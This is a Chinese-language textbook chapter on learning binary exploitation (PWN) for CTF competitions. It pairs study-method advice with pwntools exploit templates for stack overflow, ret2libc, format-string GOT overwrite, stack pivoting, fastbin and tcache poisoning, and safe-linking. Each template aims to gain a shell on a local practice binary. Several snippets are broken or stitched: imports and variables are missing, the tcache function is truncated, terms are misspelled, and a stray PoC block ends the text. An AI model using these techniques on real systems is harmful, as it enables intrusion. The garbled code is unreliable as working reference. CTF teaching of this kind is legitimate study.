# 第16章 二进制安全PWN — 练习方法

## 为什么PWN需要系统化的练习方法

二进制安全PWN是网络安全领域中技术门槛最高的方向之一。它要求学习者同时具备汇编语言、操作系统原理、编译器机制、内存管理等多学科知识，并能将这些知识融会贯通，形成对二进制程序的"直觉性理解"。与Web安全不同，PWN的学习曲线极其陡峭——初学者往往在第一个栈溢出题目上就卡住数周，而从入门到能在CTF比赛中稳定解出PWN题，通常需要6-12个月的持续投入。

这并不意味着PWN难以学会，而是说明**方法比努力更重要**。很多学习者陷入"刷题-卡住-看WP-觉得懂了-下一题又不会"的无效循环，根本原因在于缺乏系统化的练习框架。本章将从学习方法论、分阶段路线图、实验室搭建、调试技巧、常见误区五个维度，构建一套完整的PWN练习体系。

### 刻意练习在PWN中的应用

心理学家Anders Ericsson提出的"刻意练习"理论强调：真正的技能提升来自有明确目标、即时反馈、持续走出舒适区的练习。在PWN中，这意味着：

1. **明确目标**：每次练习前确定本次要强化的具体技能点（如"掌握off-by-one的识别"而非"做一道堆题"）
2. **即时反馈**：每次利用失败后，分析是哪个环节出了问题——payload构造错误？gadget选错？偏移计算有误？
3. **走出舒适区**：如果某类题目已经能流畅完成，立即切换到更难的类型
4. **复盘总结**：每次练习后记录"学到了什么新东西"和"哪里卡住了"，这两个问题的答案才是真正的收获

### 费曼学习法与PWN

Richard Feynman的学习方法核心是"如果你不能用简单的语言解释一件事，你就没有真正理解它"。在PWN练习中：

- **教别人**：尝试向非安全领域的朋友解释"什么是栈溢出"和"为什么覆盖返回地址能控制程序流"。如果你只能说出术语而不能用类比和直觉解释，说明理解还不够深
- **写解题报告**：不是写给自己看的流水账，而是写给"两个月前的自己"看的教程。能写清楚，才算真懂
- **画图**：栈帧布局、堆chunk结构、ROP链——这些抽象概念必须可视化。手绘比用工具画更有助于记忆

```python
# first_exploit.py — 第一个栈溢出exploit模板

# 目标程序：一个简单的有栈溢出漏洞的程序
# void win() { system("/bin/sh"); }
# void vuln() { char buf[64]; gets(buf); }

# 启动目标程序

offset = 76  # buf(64) + padding(8) + saved_ebp(4) = 76

payload = b'A' * offset
payload += p32(0x08049196)  # win函数的地址（用GDB或objdump查看）

# 发送payload
p.sendline(payload)

# 获得shell
p.interactive()
```

### 第二阶段：绕过保护机制（2-4周）

**核心目标：** 掌握NX、ASLR、PIE等保护机制的绕过方法。

**学习顺序和原理：**

```text
NX (No-Execute)          ASLR (地址随机化)         PIE (位置无关可执行)
    │                         │                         │
    ▼                         ▼                         ▼
ret2libc               泄露libc基地址             泻露程序基地址
    │                    │                           │
    ▼                    ▼                           ▼
ROP链构造              ret2plt + 泄露               控制流劫持
    │                    │                           │
    ▼                    ▼                           ▼
ret2csu               完整ROP利用链              信息泄露 + 任意地址写
```

**ret2libc原理与实战：**

ret2libc的核心思想是：即使栈上不能执行代码（NX开启），我们仍然可以调用程序已经链接的libc函数。通过覆盖返回地址为`system()`的地址，并在栈上布置好参数`"/bin/sh"`的地址，就能获得shell。

```python
# ret2libc_template.py — ret2libc利用模板（32位程序）
from pwn import *

context.log_level = 'debug'
context.arch = 'i386'

p = process('./vuln')
elf = ELF('./vuln')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

# 第一步：泄露libc基地址
# 利用 puts@plt 打印 puts@got 的内容
# 需要两次溢出：第一次泄露，第二次利用

# payload1：调用puts(puts@got)泄露puts的真实地址
payload1 = b'A' * offset
payload1 += p32(elf.plt['puts'])     # 调用puts@plt
payload1 += p32(elf.symbols['main']) # 返回到main，实现二次溢出
payload1 += p32(elf.got['puts'])     # puts的参数：puts@got的地址

p.sendline(payload1)
p.recvuntil(b'\n')

# 接收泄露的地址
puts_leak = u32(p.recv(4))
log.success(f'puts@libc: {hex(puts_leak)}')

# 计算libc基地址
libc_base = puts_leak - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

log.success(f'libc base: {hex(libc_base)}')
log.success(f'system: {hex(system_addr)}')
log.success(f'/bin/sh: {hex(bin_sh_addr)}')

# 第二次溢出：调用system("/bin/sh")
payload2 = b'A' * offset
payload2 += p32(system_addr)      # 调用system
payload2 += b'BBBB'               # system的返回地址（随便填）
payload2 += p32(bin_sh_addr)      # system的参数："/bin/sh"

p.sendline(payload2)
p.interactive()
```

**ROP链构造的核心技巧：**

1. **ret2csu**：利用`__libc_csu_init`中的通用gadgets，可以控制任意3个寄存器（rdi、rsi、rdx），是64位程序ROP链的基础
2. **ret2plt**：直接调用PLT表中的函数，无需知道libc基地址
3. **ret2syscall**：通过gadgets构造`syscall`调用，不需要任何库函数

**练习题目推荐：**
- BUUCTF：ciscn_2019_c_1（经典ret2libc）、ciscn_2019_n_1（简单栈溢出）
- pwnable.tw：start（ret2scasm入门）、orw（open-read-write shellcode）
- ROP Emporium（https://ropemporium.com）：从ret2win到ret2csu的渐进式ROP练习

### 第三阶段：格式化字符串与高级栈利用（2-3周）

**核心目标：** 掌握格式化字符串漏洞的读写能力，以及栈迁移等高级技术。

**格式化字符串漏洞的本质：**

当printf的第一个参数由用户控制时，格式化说明符（如`%x`、`%n`）会按照栈上的数据来读取或写入。这个漏洞的利用分两个层面：

| 用途 | 格式化说明符 | 作用 | 典型场景 |
|------|-------------|------|----------|
| 读任意地址 | `%s`、`%{n}$p` | 将栈上第n个参数作为指针，读取其指向的内容 | 泄露canary、libc地址、栈地址 |
| 写任意地址 | `%{n}$n` | 将已输出的字符数写入栈上第n个参数指向的地址 | 覆盖GOT表、修改返回地址 |
| 精确写入 | `%{value}c%{n}$hn` | 写入指定的2字节值 | 分两次写入完成4/8字节地址覆盖 |

**格式化字符串利用模板：**

```python
# fmt_str_exploit.py — 格式字符串漏洞利用模板
from pwn import *

context.arch = 'amd64'
elf = ELF('./vuln')
p = process('./vuln')

def exec_fmt(payload):
    """发送payload并接收响应，用于自动计算偏移"""
    p = process('./vuln')
    p.sendline(payload)
    return p.recvall()

# 自动计算格式化字符串的偏移
# FmtStr(exec_fmt) 会自动找到 "%{n}$p" 中n的值
fmt_str = FmtStr(exec_fmt)
offset = fmt_str.offset
log.success(f'Format string offset: {offset}')

# 手动泄露栈上数据（如果自动计算失败）
p.sendline(b'AAAA%p.%p.%p.%p.%p.%p.%p.%p')
print(p.recv())

# 写入利用：覆盖GOT表中的某个函数地址
# 假设要将puts@got覆盖为system@plt
# 需要分多次写入（每次写2字节用%hn）
writes = {elf.got['puts']: elf.symbols['system']}
payload = fmt_str.write_fmt_payload(writes=writes, numbwritten=0)
p.sendline(payload)
p.interactive()
```

**栈迁移（Stack Pivoting）：**

当可用的栈溢出空间太小，无法放下完整的ROP链时，需要将栈"迁移"到一个更大的可控区域（如BSS段或堆上）。

```python
# stack_pivot.py — 栈迁移模板
from pwn import *

context.arch = 'amd64'

# 假设溢出空间只有8字节（只够覆盖返回地址）
# 但在BSS段上我们可以通过其他方式（如read）写入大量数据

# 步骤1：在BSS段布置完整ROP链
bss_addr = 0x404800  # BSS段地址

# 步骤2：用leave; ret gadget迁移栈
# leave = mov rsp, rbp; pop rbp
# 先通过第一次溢出，将rbp设为bss_addr
# 然后leave会将rsp指向bss_addr
# 再ret就会从bss_addr上取返回地址

leave_ret = 0x4011d9  # leave; ret 的地址

# 第一次溢出：仅覆盖rbp和返回地址
payload = b'A' * 64         # 填充到saved rbp
payload += p64(bss_addr)    # 覆盖saved rbp为BSS地址
payload += p64(leave_ret)   # 返回地址设为leave; ret
```

### 第四阶段：堆利用入门（3-4周）

**核心目标：** 理解ptmalloc2堆管理器的工作原理，掌握fastbin/tcache的基本利用方法。

**堆管理器的核心数据结构：**

理解堆利用的第一步是理解malloc/free的内部机制。glibc的ptmalloc2管理器使用以下核心结构：

```c
// malloc_chunk — 每个堆块的头部结构（64位系统）
struct malloc_chunk {
    size_t mchunk_prev_size;  // 前一个chunk的大小（仅当前一个chunk空闲时有效）
    size_t mchunk_size;       // 当前chunk的大小（低3位存储标志位）
    struct malloc_chunk *fd;  // forward pointer（仅空闲chunk有效）
    struct malloc_chunk *bk;  // backward pointer（仅空闲chunk有效）
    // ... 更多字段用于largebin等
};
```

**堆利用的关键攻击原语：**

| 攻击原语 | 漏洞类型 | 可实现的效果 |
|---------|---------|-------------|
| UAF (Use-After-Free) | 释放后继续使用指针 | 读写已释放chunk的内容 |
| Double Free | 同一chunk释放两次 | 在fastbin/tcache中制造环形链表 |
| Heap Overflow | 堆上缓冲区溢出 | 覆盖相邻chunk的metadata |
| Off-by-One | 多写/少写1字节 | 修改相邻chunk的size字段 |
| Uninitialized Memory | 使用未初始化的堆内存 | 堆喷后获得可控指针 |

**Fastbin Attack基本流程：**

```python
# fastbin_attack.py — fastbin attack模板
from pwn import *

p = process('./vuln')
elf = ELF('./vuln')
libc = ELF('./libc.so.6')

def alloc(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def show(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())

# 典型fastbin attack步骤：
# 1. 分配两个相同大小的chunk
alloc(0x60, b'A' * 0x60)  # chunk0
alloc(0x60, b'B' * 0x60)  # chunk1

# 2. 释放chunk0（进入fastbin）
free(0)

# 3. 利用UAF/溢出修改chunk0的fd指针
# 将fd指向目标地址（如__malloc_hook附近）
target = libc.symbols['__malloc_hook'] - 0x23  # 需要伪造size字段
# ... 通过漏洞修改fd ...

# 4. 分配两次，第二次会返回目标地址
alloc(0x60, b'C' * 0x60)  # 取回chunk0
alloc(0, target_data)       # 分配到目标地址

# 5. 在目标地址写入one_gadget
# 6. 触发malloc执行one_gadget
```

### 第五阶段：高级堆利用（3-4周）

**核心目标：** 掌握House系列利用技术和不同glibc版本的安全检查绕过。

**House系列对比：**

| House名称 | 核心思想 | 适用版本 | 难度 |
|-----------|---------|---------|------|
| House of Force | 利用top chunk的size字段覆盖，通过超大malloc控制分配位置 | 所有版本（需能修改top chunk size） | ★★☆ |
| House of Spirit | 在栈上伪造fastbin chunk，free后进入fastbin，再次malloc获得栈上地址 | 所有版本 | ★★☆ |
| House of Lore | 伪造smallbin的fd/bk链表，绕过双向链表检查 | 所有版本 | ★★★ |
| House of Einherjar | 利用off-by-null覆盖前一个chunk的size标志位，合并chunk | glibc < 2.29 | ★★★★ |
| House of Orange | 不调用free，通过修改top chunk触发sysmalloc，将旧top chunk放入unsorted bin | glibc < 2.26 | ★★★★ |
| House of Banana | 利用rtld (动态链接器) 的链表结构劫持控制流 | 所有版本 | ★★★★★ |

**glibc版本差异要点：**

```python
# glibc版本检测和适配模板
import subprocess

def get_glibc_version():
    """检测系统glibc版本"""
    output = subprocess.check_output(['ldd', '--version']).decode()
    version_line = output.split('\n')[0]
    # 提取版本号
    import re
    match = re.search(r'(\d+\.\d+)', version_line)
    return float(match.group(1))

version = get_glibc_version()
print(f'glibc version: {version}')

# 关键版本差异：
# 2.23: fastbin无double free检查（仅检查相邻chunk）
# 2.26: 引入tcache，大幅改变了堆利用方式
# 2.27: tcache加入key字段，但可伪造
# 2.29: 加入对齐检查，House of Einherjar需要额外绕过
# 2.31: tcache加入更严格的double free检查（key == tcache）
# 2.32: 引入safe-linking（tcache fd指针异或加密）
# 2.34: 移除了__malloc_hook/__free_hook

if version >= 2.32:
    print('注意：需要绕过safe-linking机制')
    # safe-linking: fd = (addr >> 12) ^ real_fd
    # 绕过方法：已知堆地址的高12位（通常是固定的），反推fd应设置的值
    def safe_link_encode(addr, pos):
        return (addr >> 12) ^ pos
```

```python
# 只需修改fd指针即可控制下一次malloc的位置

def tcache_poison(size, target_addr):
    """通用tcache poisoning模板"""
    # 分配两个相同大小的chunk
    alloc(size, b'A' * size)  # chunk0

    show(1)  # 如果有UAF，读取fd的值
    # 修改fd指向target_addr
    # edit(1, p64(target_addr))

    # 分配两次，第二次返回target_addr
```

**Safe-Linking绕过（glibc 2.32+）：**

```python
def safe_link_encrypt(pos, addr):
    """
    Safe-Linking加密公式：fd = (pos >> 12) ^ addr
    pos: 当前chunk的fd字段地址（不是chunk的起始地址）
    addr: 要指向的真实目标地址
    
    绕过前提：需要知道堆地址的高12位（通常可以通过泄露获得）
    """
    return (pos >> 12) ^ addr
```

**Kernel PWN常用漏洞类型：**

| 漏洞类型 | 利用思路 | 常见于 |
|---------|---------|--------|
| Stack Overflow | 覆盖内核栈上的返回地址 | 内核模块未检查输入长度 |
| UAF | 劫持内核对象的函数指针 | 驱动未正确处理资源释放 |
| Race Condition | 利用竞态条件修改内核数据 | 多线程驱动中的TOCTOU |
| Integer Overflow | 分配过小的缓冲区导致越界 | 驱动中的size计算错误 |

## 常见误区与瓶颈突破

### 入门阶段的常见误区

**误区1：直接上手做题，不学基础**

很多初学者看到PWN题就直接上手，用pwntools发payload，成功了也不知道为什么成功，失败了也不知道哪里错。正确做法是先花一周时间理解栈帧结构和函数调用过程。

**误区2：过度依赖工具，不理解原理**

pwntools的`cyclic`、`ROPgadget`等工具确实方便，但如果不知道偏移是怎么计算的、gadget是怎么工作的，遇到变体就束手无策。工具是用来提效的，不是用来绕过理解的。

**误区3：只看WP不自己做**

看WP觉得"懂了"和自己独立做出是完全不同的能力。看WP获得的是知识，自己做获得的是能力。知识可以搜索，能力必须练习。

**误区4：忽略32位程序，直接学64位**

64位程序的ROP链构造更复杂（需要处理寄存器传参、16字节栈对齐）。建议先完全掌握32位，再过渡到64位。

### 中级阶段的瓶颈突破

**瓶颈1：堆利用看不懂**

堆利用的难点在于数据结构复杂、版本差异大。突破方法：

1. 先用how2heap的每个example手动调试一遍，理解每个步骤堆的状态变化
2. 画出堆chunk的链表结构图，标注每个chunk的fd/bk指向
3. 先学fastbin（最简单），再学tcache，最后学unsorted/small/large bin
4. 用pwndbg的`vis_heap_chunks`和`bins`命令反复观察

**瓶颈2：遇到新题型没有思路**

1. 分析程序的功能，列出所有用户可控的输入点
2. 检查保护级别，确定哪些利用方法可行
3. 尝试在输入中注入特殊字符（如`%x`、超长字符串），观察程序反应
4. 如果是堆题，先确定漏洞类型（UAF？溢出？off-by-one？），再选择利用方法

**瓶颈3：Exploit本地成功，远程失败**

最常见的原因是libc版本不同。解决方法：

```bash
# 1. 确定远程libc版本
# 如果远程提供了libc文件，直接使用
# 如果没有，通过泄露的函数地址查表确定版本

# 2. 使用pwninit自动patch
pwninit --bin ./vuln --libc ./remote_libc.so.6 --ld ./remote_ld-linux.so

# 3. 或者使用patchelf手动替换
patchelf --set-interpreter ./ld-linux.so.2 ./vuln
patchelf --replace-needed libc.so.6 ./libc-2.27.so ./vuln

# 4. 如果是栈对齐问题（64位程序）
# system()需要16字节栈对齐，在payload中加一个ret gadget
ret_gadget = 0x401016  # 随便一个ret指令的地址
payload = b'A' * offset + p64(ret_gadget) + p64(system_addr) + p64(0) + p64(bin_sh)
```

```bash
# 获取真实漏洞的PoC
```
